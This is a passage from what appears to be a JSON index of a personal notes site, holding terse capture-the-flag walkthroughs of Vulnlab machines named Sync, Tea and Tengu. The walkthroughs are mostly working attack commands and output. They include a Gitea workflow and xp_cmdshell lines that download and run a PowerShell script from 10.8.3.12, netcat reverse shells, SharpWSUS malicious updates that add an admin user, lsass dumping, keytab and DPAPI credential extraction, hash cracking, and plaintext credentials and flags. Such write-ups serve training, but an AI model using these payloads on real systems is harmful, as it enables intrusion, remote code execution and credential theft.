given hash if hashed_string == target_hash: print(f\u0026#39;Password found: {password}\u0026#39;) break else: print(\u0026#39;Password not found in the file.\u0026#39;)\rPassword found : gerald\nFoothold : We have write access and there is an ssh port open so we can create an .ssh folder with an authorized_keys to be able to connect with ssh\nWe found a backup directory we extract it on our machine and got passwd and shadow file so we tried to cracks it :\nunshadow passwd shadow \u0026gt; unshadowed.txt john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt sakura (sa) gerald (jennifer) gerald (triss) User : VL{bcf845cf94864fbba7e016d9fcd3a2db}\nWe see that sakura has write permission on backup file so we modify the file un put another reverse shell and wait : ![[sync.png]]\nRoot : VL{1ce8506d2bec0abb03177353db237e1b}\n","date":"2023-09-07","id":105,"permalink":"/notes/lab/vulnlab/sync/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e21/tcp  open  ftp     vsftpd 3.0.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e 516254e8c91bab8266a85b6b83fa3294 \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e 8a2c9a78812ba19a10bb00bfeecbf832 \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp  open  http    Apache httpd 2.4.52 \u003cspan class=\"o\"\u003e((\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-cookie-flags: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   /: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     PHPSESSID: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_      httponly flag not \u003cspan class=\"nb\"\u003eset\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Login\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.52 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e873/tcp open  rsync   \u003cspan class=\"o\"\u003e(\u003c/span\u003eprotocol version 31\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OSs: Unix, Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync -av rsync://\u003cspan class=\"nv\"\u003e$target\u003c/span\u003e:873/httpd ./\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1\u003cspan class=\"p\"\u003e|\u003c/span\u003eadmin\u003cspan class=\"p\"\u003e|\u003c/span\u003e7658a2741c9df3a97c819584db6e6b3c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2\u003cspan class=\"p\"\u003e|\u003c/span\u003etriss\u003cspan class=\"p\"\u003e|\u003c/span\u003ea0de4d7f81676c3ea9eabcadfd2536f6\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEasy Brute force :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport hashlib\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Function to compute the MD5 hash of a given string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef compute_md5_hash\u003cspan class=\"o\"\u003e(\u003c/span\u003einput_string\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e hashlib.md5\u003cspan class=\"o\"\u003e(\u003c/span\u003einput_string.encode\u003cspan class=\"o\"\u003e())\u003c/span\u003e.hexdigest\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Given parameters\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esecure_string\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;6c4972f3717a5e881e282ad3105de01e\u0026#39;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Replace with actual secure string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;triss\u0026#39;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Replace with actual username\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003etarget_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a0de4d7f81676c3ea9eabcadfd2536f6\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Open and read the file containing potential passwords\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewith open\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e as file:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e line in file:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Remove any leading/trailing whitespace characters like newlines\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003epassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e line.strip\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Create the string to be hashed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003estring_to_hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f\u003cspan class=\"s1\"\u003e\u0026#39;{secure_string}|{username}|{password}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Compute the hash of the string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ehashed_string\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e compute_md5_hash\u003cspan class=\"o\"\u003e(\u003c/span\u003estring_to_hash\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Compare with the given hash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003ehashed_string\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e target_hash:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s1\"\u003e\u0026#39;Password found: {password}\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Password not found in the file.\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePassword found : gerald\u003c/p\u003e","tags":[],"title":"Sync"},{"content":"Scan 1 :\n53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-12 13:16:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services\rScan 2 :\n80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 3000/tcp open ppp? 3389/tcp open ms-wbt-server Microsoft Terminal Services\rFirst foothold : - Create an account - Create a folder and enable action in the repo settings\rUpload the folder : .gitea/workflows/demo.yaml name: Execute wget (or curl) on commit or push on: [push] jobs: Execute-Wget: runs-on: windows-latest steps: - name: Execute curl command run: | powershell IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;) shell: cmd\rPush random item to get a shell\nFirst user :\nthomas.wallace jiri.formacek\rFlag : VL{4e1989d1fe9a7cfc26c56efd7e7df933}\nLaps v2 : Get-LAPSADPassword -Identity srv Get-LapsADPassword -Identity srv -DomainController dc -AsPlainText\rComputerName : SRV DistinguishedName : CN=SRV,OU=Servers,DC=tea,DC=vl Account : Administrator Password : NC4X9563Yl+;$M PasswordUpdateTime : 9/18/2024 12:25:00 AM ExpirationTimestamp : 10/18/2024 12:25:00 AM Source : EncryptedPassword DecryptionStatus : Success AuthorizedDecryptor : TEA\\Server Administration\rFlag VL{0625916903cc1c866ad33c963a400a61}\nCreds : thomas.wallace:6e-34tD8B2QJ\rWSUS Update : https://github.com/techspence/SharpWSUS SharpWSUS.exe locate SharpWSUS.exe inspect SharpWSUS.exe create /payload:\u0026#34;C:\\tools\\PsExec64.exe\u0026#34; /args:\u0026#34; -accepteula -s -d C:\\_install\\nc.exe -e cmd.exe 10.8.3.12 4242\u0026#34; /title:\u0026#34;CVE-2022-30190\u0026#34; SharpWSUS.exe approve /updateid:7d18aee2-2c8e-4857-b61e-1408a653dcbe /computername:dc.tea.vl /groupname:\u0026#34;Group Name\u0026#34; #or SharpWSUS.exe create /payload:\u0026#34;C:\\_install\\PsExec64.exe\u0026#34; /args:\u0026#34;-accepteula -s -d cmd.exe /c \\\u0026#34; net user pavic Password_123 /add \\\u0026#34;\u0026#34; SharpWSUS.exe create /payload:\u0026#34;C:\\_install\\PsExec64.exe\u0026#34; /args:\u0026#34;-accepteula -s -d cmd.exe /c \\\u0026#34;net localgroup administrators pavic /add \\\u0026#34;\u0026#34;\rhttps://0xdf.gitlab.io/2022/12/10/htb-outdated.html\nRoot : VL{9bb75d5911b1a1f9bfe115facf5a6039}\n","date":"2023-09-07","id":106,"permalink":"/notes/lab/vulnlab/tea/","summary":"\u003cp\u003eScan 1 :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-09-12 13:16:35Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: tea.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: tea.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eScan 2 :\u003c/p\u003e","tags":[],"title":"Tea"},{"content":"Scan :\nLinux\nPORT STATE SERVICE 22/tcp open ssh 1880/tcp open vsat-control\rSQL\nPORT STATE SERVICE 3389/tcp open ms-wbt-server |_ssl-date: 2024-08-22T08:14:23+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: TENGU | NetBIOS_Domain_Name: TENGU | NetBIOS_Computer_Name: SQL | DNS_Domain_Name: tengu.vl | DNS_Computer_Name: SQL.tengu.vl | DNS_Tree_Name: tengu.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-08-22T08:14:23+00:00 | ssl-cert: Subject: commonName=SQL.tengu.vl | Not valid before: 2024-03-24T13:19:50 |_Not valid after: 2024-09-23T13:19:50\rRCE : https://gist.github.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297\nDecrypt password : https://gist.github.com/Yeeb1/fe9adcd39306e3ced6bdfc7758a43519\n{\u0026#39;d237b4c16a396b9e\u0026#39;: {\u0026#39;username\u0026#39;: \u0026#39;nodered_connector\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;DreamPuppyOverall25\u0026#39;}}\rConnect with mssql with theses creds : SQL (nodered_connector nodered_connector@Dev)\u0026gt; SELECT TABLE_NAME FROM Demo.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = \u0026#39;BASE TABLE\u0026#39;; TABLE_NAME ---------- Users SQL (nodered_connector nodered_connector@Dev)\u0026gt; use demo [*] ENVCHANGE(DATABASE): Old Value: Dev, New Value: Demo [*] INFO(SQL): Line 1: Changed database context to \u0026#39;Demo\u0026#39;. SQL (nodered_connector nodered_connector@Demo)\u0026gt; select * from Users ; ID Username Password ---- --------------- ------------------------------------------------------------------- NULL b\u0026#39;t2_m.winters\u0026#39; b\u0026#39;af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147\u0026#39;\rNew creds :\nt2_m.winters : Tengu123 nodered_connector : DreamPuppyOverall25 t1_c.fowler : WDAGUtilityAccount : #Now root on the linux machine User VL{2c6d9107958f338659c95a810e4938d5}\nRetrieve keystab : cat /etc/krb5.keytab | base64 python3 keytabextract.py file.keytab\rpython3 keytabextract.py krb5.keytab [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash. [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction. [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction. [+] Keytab File successfully imported. REALM : TENGU.VL SERVICE PRINCIPAL : NODERED$/ NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49 AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096 AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f\rNODERED$ : d4210ee2db0c03aa3611c9ef8a4dbf49\rproxychains -q bloodhound-python -d \u0026#39;tengu.vl\u0026#39; -u \u0026#39;NODERED$\u0026#39; --hashes \u0026#39;:d4210ee2db0c03aa3611c9ef8a4dbf49\u0026#39; -ns 10.10.158.181 -dc DC.tengu.vl -c all\rproxychains -q nxc ldap 10.10.158.181 -u \u0026#39;NODERED$\u0026#39; -H \u0026#39;d4210ee2db0c03aa3611c9ef8a4dbf49\u0026#39; --gmsa Account: gMSA01$ NTLM: d4b65861e85773fba2035b31ebcacb37\rConstrained delegation:\nproxychains -q getST.py tengu.vl/gMSA01$ -spn \u0026#39;MSSQLSvc/SQL.tengu.vl:1433\u0026#39; -impersonate \u0026#39;T1_M.WINTERS\u0026#39; -hashes :d4b65861e85773fba2035b31ebcacb37 -dc-ip DC.tengu.vl export KRB5CCNAME=T1_M.WINTERS.ccache proxychains -q mssqlclient.py -k SQL.tendu.vl\rFoothold : EXEC xp_cmdshell \u0026#39;powershell -Command \u0026#34;\u0026amp; {IEX (New-Object Net.WebClient).DownloadString(\u0026#39;\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;\u0026#39;)}\u0026#34;\u0026#39;; PrintSpoofer.exe -c \u0026#34;C:\\tools\\nc.exe 10.8.3.12 3333 -e cmd\u0026#34;\rUser VL{e1f0df5961b9a6e06e9a3836cf414d56}\nDump : procdump.exe -accepteula -ma lsass.exe lsass.dmp pypykatz lsa minidump lsass.dmp\rCreds: SQL$ : 740a641ebed8f94dd009dd576bcae0cc gMSA01$ b571730c862f68e2bb2e39b632d888a4\rgMSA again : proxychains -q nxc ldap 10.10.158.181 -u \u0026#39;SQL$\u0026#39; -H \u0026#39;740a641ebed8f94dd009dd576bcae0cc\u0026#39; --gmsa Account: gMSA01$ NTLM: d4b65861e85773fba2035b31ebcacb37 Account: gMSA02$ NTLM: 1baebed1f44a7f60ec622232a1d885db\rcmd /c \u0026#34;curl http://10.8.3.12:8080/SharpDPAPI.exe \u0026gt; SharpDPAPI.exe\u0026#34;\rFolder : C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials CredFile : 67B6C9FA0475C51A637428875C335AAD guidMasterKey : {1415bc56-749a-4f03-8a8e-9fb9733359ab} size : 576 flags : 0x20000000 (CRYPTPROTECT_SYSTEM) algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256) description : Local Credential Data LastWritten : 3/10/2024 2:49:34 PM TargetName : Domain:batch=TaskScheduler:Task:{3C0BC8C6-D88D-450C-803D-6A412D858CF2} TargetAlias : Comment : UserName : TENGU\\T0_c.fowler Credential : UntrimmedDisplaceModify25\rGet-Acl Task.ps1 schtasks /query /fo LIST /v type shell.ps1 \u0026gt; Task.ps1 Get-ScheduledTask -TaskName \u0026#34;Daily_Checkup\u0026#34; | Start-ScheduledTask rdesktop -u \u0026#34;T0_c.fowler\u0026#34; -d TENGU DC.tengu.vl #or cat \\\\dc.tengu.vl\\C$\\Users\\Administrator\\Desktop\\root.txt\rRoot VL{6f106b09ff464e7ef0b36483e348dbc9}\n","date":"2023-09-07","id":107,"permalink":"/notes/lab/vulnlab/tengu/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\u003cp\u003eLinux\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1880/tcp open  vsat-control\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eSQL\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-22T08:14:23+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: TENGU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: TENGU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: SQL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 